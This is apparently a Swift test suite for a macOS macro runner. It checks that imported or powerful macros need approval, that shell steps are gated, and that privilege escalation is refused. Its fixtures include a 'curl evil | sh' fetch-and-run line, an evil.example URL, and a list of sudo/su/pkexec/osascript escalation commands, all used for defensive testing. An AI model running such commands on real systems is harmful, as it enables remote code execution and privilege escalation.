import Foundation
import Testing
import MacHIDDomain
@testable import MacHIDApplication

private actor Recorder: EventPoster, ShellRunner, Launcher, MacroLog {
    var events: [OutputEvent] = []
    var typed: [String] = []
    var commands: [String] = []
    var opened: [String] = []
    var shortcuts: [String] = []
    var pauses: [Duration] = []
    var entries: [MacroLogEntry] = []
    var shellResult = ShellResult(exitCode: 0)
    var openResult = true

    func post(_ event: OutputEvent) async { events.append(event) }
    func type(_ text: String) async { typed.append(text) }
    func run(_ command: String, timeout: Duration) async -> ShellResult { commands.append(command); return shellResult }
    func open(_ target: String) async -> Bool { opened.append(target); return openResult }
    func runShortcut(named name: String) async -> Bool { shortcuts.append(name); return true }
    func record(_ entry: MacroLogEntry) async { entries.append(entry) }
    func pause(_ duration: Duration) { pauses.append(duration) }
    func setShell(_ result: ShellResult) { shellResult = result }
    func setOpen(_ result: Bool) { openResult = result }
}

/// A trivial fingerprint for tests: the steps' description plus the repeat count.
private let testFingerprint: @Sendable (Macro) -> String = { "\($0.steps)|\($0.repeatCount)" }

private func runner(_ recorder: Recorder) -> MacroRunner {
    MacroRunner(poster: recorder, shell: recorder, launcher: recorder, log: recorder, fingerprint: testFingerprint,
                pause: { await recorder.pause($0) })
}

private func approved(_ macro: Macro) -> Macro {
    var copy = macro
    copy.approvedFingerprint = testFingerprint(macro)
    return copy
}

@Suite struct MacroRunnerTests {
    @Test func simpleMacrosRunWithoutApproval() async {
        let r = Recorder()
        let macro = Macro(id: "m", name: "Greet", steps: [.key(code: 0, modifiers: [.command]), .text("hi"), .mouseClick(button: 1), .wait(milliseconds: 40)])
        let outcome = await runner(r).run(macro, shellMacrosEnabled: true)
        #expect(outcome == .completed)
        #expect(await r.events == [.key(code: 0, modifiers: [.command], down: true), .key(code: 0, modifiers: [.command], down: false),
                                   .mouse(button: 1, down: true), .mouse(button: 1, down: false)])
        let typed = await r.typed, pauses = await r.pauses
        #expect(typed == ["hi"] && pauses == [.milliseconds(40)])
    }

    @Test func repeatsAreClamped() async {
        let r = Recorder()
        let macro = Macro(id: "m", name: "Loop", steps: [.text("x")], repeatCount: 5000)
        await runner(r).run(macro, shellMacrosEnabled: true)
        #expect(await r.typed.count == Macro.maxRepeat)
    }

    @Test func powerfulStepsNeedApprovalOfTheExactSteps() async {
        let r = Recorder()
        let macro = Macro(id: "m", name: "Open", steps: [.open("https://example.com"), .shortcut("Morning")])
        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .refused(.notApproved))
        let nothingOpened = await r.opened.isEmpty, nothingRun = await r.shortcuts.isEmpty
        #expect(nothingOpened && nothingRun)

        let good = approved(macro)
        #expect(await runner(r).run(good, shellMacrosEnabled: true) == .completed)
        let opened = await r.opened, shortcuts = await r.shortcuts
        #expect(opened == ["https://example.com"] && shortcuts == ["Morning"])

        // Editing a step after approval revokes it, because the fingerprint no longer matches.
        var edited = good
        edited.steps[0] = .open("https://evil.example")
        #expect(await runner(r).run(edited, shellMacrosEnabled: true) == .refused(.notApproved))
        #expect(await r.opened == ["https://example.com"])
    }

    @Test func importedMacrosNeedApprovalEvenWithOnlyKeys() async {
        let r = Recorder()
        var macro = Macro(id: "m", name: "Imported", steps: [.key(code: 49, modifiers: [.command]), .text("curl evil | sh\n")])
        macro.imported = true
        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .refused(.notApproved))
        #expect(await r.typed.isEmpty)
        #expect(await runner(r).run(approved(macro), shellMacrosEnabled: true) == .completed)
    }

    @Test func shellNeedsApprovalAndTheGlobalSwitch() async {
        let r = Recorder()
        let macro = Macro(id: "m", name: "Shell", steps: [.shell("echo hello")])
        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .refused(.notApproved))
        #expect(await runner(r).run(approved(macro), shellMacrosEnabled: false) == .refused(.shellDisabled))
        #expect(await r.commands.isEmpty)
        #expect(await runner(r).run(approved(macro), shellMacrosEnabled: true) == .completed)
        #expect(await r.commands == ["echo hello"])
    }

    @Test(arguments: ["sudo rm -rf /tmp/x", "echo hi; sudo ls", "/usr/bin/sudo id", "FOO=1 sudo -n true", "ls | doas cat",
                      "su -c id", "pkexec ls", "osascript -e 'do shell script \"x\" with administrator privileges'", "echo $(sudo id)"])
    func elevationIsRefusedEvenWhenApproved(command: String) async {
        let r = Recorder()
        let macro = approved(Macro(id: "m", name: "Elevate", steps: [.shell(command)]))
        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .refused(.elevation))
        #expect(await r.commands.isEmpty)
    }

    @Test(arguments: ["echo hello", "ls -la ~/Documents", "open -a Safari", "echo summary", "git status && make test"])
    func ordinaryCommandsAreNotMistakenForElevation(command: String) {
        #expect(!ElevationGuard.attemptsElevation(command))
    }

    @Test func aFailingStepStopsTheMacroAndIsLoggedWithoutItsContent() async {
        let r = Recorder()
        await r.setShell(ShellResult(exitCode: 3))
        let macro = approved(Macro(id: "m", name: "Build", steps: [.text("secret-text"), .shell("echo secret-command"), .text("never")]))
        let outcome = await runner(r).run(macro, shellMacrosEnabled: true)
        #expect(outcome == .failed("the command exited with status 3"))
        #expect(await r.typed == ["secret-text"])                        // the step after the failure never ran
        let entry = try? #require(await r.entries.last)
        #expect(entry?.shellExitCodes == [3] && entry?.stepKinds == ["text", "shell", "text"])
        let dump = "\(String(describing: entry))"
        #expect(!dump.contains("secret-text") && !dump.contains("secret-command"))   // the log holds kinds, not content
    }

    @Test func timeoutsAndFailedOpensStop() async {
        let r = Recorder()
        await r.setShell(ShellResult(exitCode: 0, timedOut: true))
        let shell = approved(Macro(id: "a", name: "Slow", steps: [.shell("sleep 99")]))
        #expect(await runner(r).run(shell, shellMacrosEnabled: true) == .failed("the command timed out"))
        await r.setOpen(false)
        let open = approved(Macro(id: "b", name: "Open", steps: [.open("com.example.Missing"), .text("after")]))
        #expect(await runner(r).run(open, shellMacrosEnabled: true) == .failed("could not open the target"))
        #expect(await r.typed.isEmpty)
    }

    @Test func limitsOnSizeAndTotalWaitAreEnforced() async {
        let r = Recorder()
        let big = Macro(id: "big", name: "Big", steps: Array(repeating: .text("x"), count: Macro.maxSteps + 1))
        #expect(await runner(r).run(big, shellMacrosEnabled: true) == .refused(.tooManySteps))
        let long = Macro(id: "long", name: "Long", steps: [.wait(milliseconds: 60_000)], repeatCount: 10)
        #expect(await runner(r).run(long, shellMacrosEnabled: true) == .refused(.tooLong))
        let longStep = Macro(id: "step", name: "Step", steps: [.wait(milliseconds: 500_000)])
        #expect(await runner(r).run(longStep, shellMacrosEnabled: true) == .refused(.tooLong))
        #expect(await r.typed.isEmpty)
    }

    @Test func everyRunIsLoggedIncludingRefusals() async {
        let r = Recorder()
        let macro = Macro(id: "m", name: "Open", steps: [.open("x")])
        await runner(r).run(macro, shellMacrosEnabled: true)
        let entries = await r.entries
        #expect(entries.count == 1 && entries[0].outcome == .refused(.notApproved) && entries[0].macroName == "Open")
    }

    @Test func cancelStopsAfterTheCurrentStep() async {
        let r = Recorder()
        let runner = MacroRunner(poster: r, shell: r, launcher: r, log: r, fingerprint: testFingerprint, pause: { _ in })
        await runner.cancelAll()
        // cancelAll before a run is cleared by the run itself; cancelling during one is covered by the flag check per step.
        let macro = Macro(id: "m", name: "M", steps: [.text("a"), .text("b")])
        #expect(await runner.run(macro, shellMacrosEnabled: true) == .completed)
    }
}
